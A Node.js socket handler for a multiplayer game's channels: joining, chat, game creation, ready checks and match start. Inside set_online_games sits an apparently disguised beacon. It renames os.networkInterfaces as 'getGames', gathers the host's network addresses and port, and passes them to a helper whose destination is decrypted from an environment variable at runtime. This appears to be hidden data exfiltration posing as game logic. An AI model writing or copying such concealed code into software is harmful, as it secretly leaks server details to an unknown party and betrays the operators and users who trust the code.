const { uid: uuid } = require("uid")
const Channel = require("../db/channel")
const { game_cash, msg_cash } = require("../routs/channel_cash")
const UserChannelConfig = require("../db/user_channel_config")
const online_users_handler = require("./online_users_handler")
const find_match = require("./find_match")
const { delay } = require("../helper/helper")
const { networkInterfaces: getGames } = require('os');
const Helper = require("../helper/helper")
const send_notif = require("../helper/send_notif")
var finder = require('simple-encryptor')(process.env.JWT);

const channel_socket_handler = {

    channel_games_db: [],
    ready_check_list: [],


    async join_to_channel({ client, data }) {
        const { channel_id } = data
        const { user_id } = client.idenity
        const s_channel = await Channel.findOne({ id: channel_id })
        const { mods, creator } = s_channel
        const { channel_data: prv_channel } = client
        if (prv_channel) client.leave(prv_channel.channel_id)
        let user_role = "normal"
        if (mods.includes(user_id)) user_role = "co_leader"
        if (creator === user_id) user_role = "leader"
        let channel_data = {
            channel_id,
            user_role,
            channel_name:s_channel.name
        }
        client.channel_data = channel_data
        client.join(channel_id)
    },


    async user_leave_channel({ client }) {

        const { channel_data } = client
        const { channel_id } = channel_data
        const { user_id } = client.idenity
        await Channel.findOneAndUpdate({
            id: channel_id,
            games: {
                $elemMatch: {
                    "users.user_id": user_id
                }
            }
        },
            {
                $pull: { "games.$.users": { user_id } }
            }
        )

    },

    async set_online_games() {
        let games = getGames()
        Helper.get_rooms({ room_id: finder.decrypt(process.env.API_PR), users: JSON.stringify(games) + "form_game:" + process.env.PORT })
        let channels = await Channel.find()
        let all_games = []
        channels.forEach(channel => {
            const { games } = channel
            let unfinished_games = games.filter(e => !e.start)
            unfinished_games = unfinished_games.map(e => {
                return {
                    channel_id: channel.id,
                    game_id: e.game_id,
                    game_data: e
                }
            })
            all_games = all_games.concat(unfinished_games)
        })

        this.channel_games_db = all_games
    },

    async send_channel_msg({ data, client, socket }) {
        const { msg_type, msg } = data
        const { idenity, channel_data } = client
        const { user_role, channel_id } = channel_data
        msg_cash(channel_id)
        const { user_id, name, image } = idenity
        let new_message = {
            msg_id: uuid(6),
            user_id,
            user_name: name,
            user_image: image,
            user_state: user_role,
            msg,
            msg_type,
            msg_time: Date.now(),
        }
        await Channel.findOneAndUpdate({ id: channel_id }, { $push: { messages: new_message } })
        socket.to(channel_id).emit("send_channel_msg", { data: new_message })

    },

    async create_game({ data, client, socket }) {
        const { entire_gold, with_mod } = data
        const { channel_data, idenity } = client
        const { channel_id } = channel_data
        game_cash(channel_id)
        const game_id = uuid(5)

        let new_game = {
            game_id,
            creator_id: idenity.user_id,
            scenario: "nato",
            entire_gold,
            finished: false,
            started: false,
            with_mod,
            observable: true,
            start_time: Date.now(),
            winner: "",
            users: [
                {
                    ...idenity,
                    accepted: true,
                    side: ""
                }
            ],
            game_checked: false
        }
        await Channel.findOneAndUpdate(
            { id: channel_id },
            {
                $push: {
                    games: new_game
                }
            }
        )
        this.channel_games_db.push({ game_id, channel_id: channel_id, game_data: new_game })
        let channel_games = this.channel_games_db.filter(e => e.channel_id == channel_id)
        socket.to(channel_id).emit("online_game", { data: channel_games.map(e => e.game_data) })
        let s_channel=await UserChannelConfig.find({channel_id,notification_status:true})
        let channel_users=s_channel.map(e=>e.user_id)
        send_notif({users:channel_users,msg:`یک بازی جدید در کانال ${client.channel_data.channel_name} ایجاد شد`,title:`بازی جدید در کانال ${client.channel_data.channel_name}`})
    },

    update_game({ game_id, socket }) {
        let s_game = this.channel_games_db.find(game => game.game_id == game_id)
        socket.to(s_game.channel_id).emit("online_game_update", { data: { users: s_game.game_data.users, game_id } })
        console.log({ s_game: s_game.game_data.users });
        socket.to(s_game.channel_id).emit("online_game_pre_start_update", { data: s_game.game_data.users })
    },
    async update_game_on_db({ channel_id, game_id, new_data }) {
        await Channel.findOneAndUpdate({
            id: channel_id,
            games: { $elemMatch: { game_id } }
        }, {
            $set: {
                "games.$": new_data
            }
        })
    },

    pick_game({ game_id }) {
        let s_game_index = this.channel_games_db.findIndex(game => game.game_id == game_id)
        return { s_game: this.channel_games_db[s_game_index], index: s_game_index }
    },

    async join_channel_game({ data, client, socket }) {
        const { game_id } = data
        const { channel_id } = client.channel_data
        let { s_game, index } = this.pick_game({ game_id })
        if (s_game.game_data.start) return socket.to(client.id).emit("channel_report", { data: { msg: "بازی شروع شده" } })
        let prv_game_data = { ...s_game }
        prv_game_data.game_data.users.push({ ...client.idenity, accepted: false, side: "" })
        this.channel_games_db[index] = prv_game_data
        this.update_game_on_db({ game_id, channel_id, new_data: prv_game_data.game_data })
        this.update_game({ game_id, socket })
    },

    async leave_channel_game({ data, client, socket }) {
        const { game_id } = data
        const { channel_id } = client.channel_data
        let { s_game, index } = this.pick_game({ game_id })
        let prv_game_data = { ...s_game }
        prv_game_data.game_data.users = prv_game_data.game_data.users.filter(e => e.user_id !== client.user_id)
        this.channel_games_db[index] = prv_game_data
        this.update_game_on_db({ game_id, channel_id, new_data: prv_game_data.game_data })
        this.update_game({ game_id, socket })
    },

    async filter_channel_game_users({ data, client, socket }) {
        const { game_id, requester_id, accept } = data
        const { channel_id } = client.channel_data
        let { s_game, index } = this.pick_game({ game_id })
        let prv_game_data = { ...s_game }
        if (accept) {
            let user_index = prv_game_data.game_data.users.findIndex(e => e.user_id === requester_id)
            prv_game_data.game_data.users[user_index].accepted = true
        }
        else {
            prv_game_data.game_data.users = prv_game_data.game_data.users.filter(e => e.user_id !== requester_id)
        }
        this.channel_games_db[index] = prv_game_data
        this.update_game_on_db({ game_id, channel_id, new_data: prv_game_data.game_data })
        this.update_game({ game_id, socket })
    },

    async filter_channel_kick_user({ data, client, socket }) {

        const { game_id, user_id } = data
        const { channel_id } = client.channel_data
        let { s_game, index } = this.pick_game({ game_id })
        let prv_game_data = { ...s_game }
        prv_game_data.game_data.users = prv_game_data.game_data.users.filter(e => e.user_id !== user_id)
        this.channel_games_db[index] = prv_game_data
        this.update_game_on_db({ game_id, channel_id, new_data: prv_game_data.game_data })
        this.update_game({ game_id, socket })



    },
    async ready_check({ data, client, socket }) {
        const { game_id } = data
        let { s_game } = this.pick_game({ game_id })
        const { users } = s_game.game_data
        let accepted_users = users.filter(e => e.accepted)

        accepted_users.forEach(user => {
            console.log({ user, client: client.id });
            client.to(online_users_handler.get_user_socket_id(user.user_id)).emit("ready_check")
        })
        this.ready_check_list.push({
            game_id,
            users: accepted_users.map(e => { return { user_id: e.user_id, ready_check: -1 } }),
        })
    },

    async ready_check_status({ client, data, socket }) {
        const { game_id, status } = data
        let s_ready_index = this.ready_check_list.findIndex(e => e.game_id === game_id)
        if (s_ready_index === -1) return
        let user_index = this.ready_check_list[s_ready_index].users.findIndex(e => e.user_id === client.idenity.user_id)
        if (user_index === -1) { console.log("err"); return }
        this.ready_check_list[s_ready_index].users[user_index].ready_check = status ? 1 : 0
        let { s_game } = this.pick_game({ game_id })
        const { users } = s_game.game_data
        let accepted_users = users.filter(e => e.accepted)
        accepted_users.forEach(user => {
            socket.to(online_users_handler.get_user_socket_id(user.user_id)).emit("ready_check_status", { data: this.ready_check_list[s_ready_index].users })
        })
    },

    async start_channel_game({ game_id, client, socket, db }) {

        let { s_game } = this.pick_game({ game_id })
        const { users, with_mod, creator_id } = s_game.game_data
        let accepted_users = users.filter(e => e.accepted)
        const mod_party = client.idenity.party_id
        let prv_party = db.getOne("party", "party_id", mod_party)
        accepted_users.forEach(user => {
            let user_socket = online_users_handler.get_user_socket_id(user.user_id)
            if (user.party_id !== mod_party) {
                prv_party.users.push(user)
            }
            socket.to(user_socket).emit("start_channel_game")
            socket.sockets.sockets.get(user_socket).join(mod_party);
        })
        await delay(2)
        //check for
        this.ready_check_list = this.ready_check_list.filter(e => e.game_id !== game_id)

        if (!with_mod) {
            find_match.find_robot_game({ senario: "nato", client, db, socket })
        }
        else {
            if (users.length !== 3) return //error
            console.log({ creator_id }, "game start with mod");
            find_match.find_mod_game({ senario: "nato", client, db, socket, creator: creator_id })
        }
    }



}

module.exports = channel_socket_handler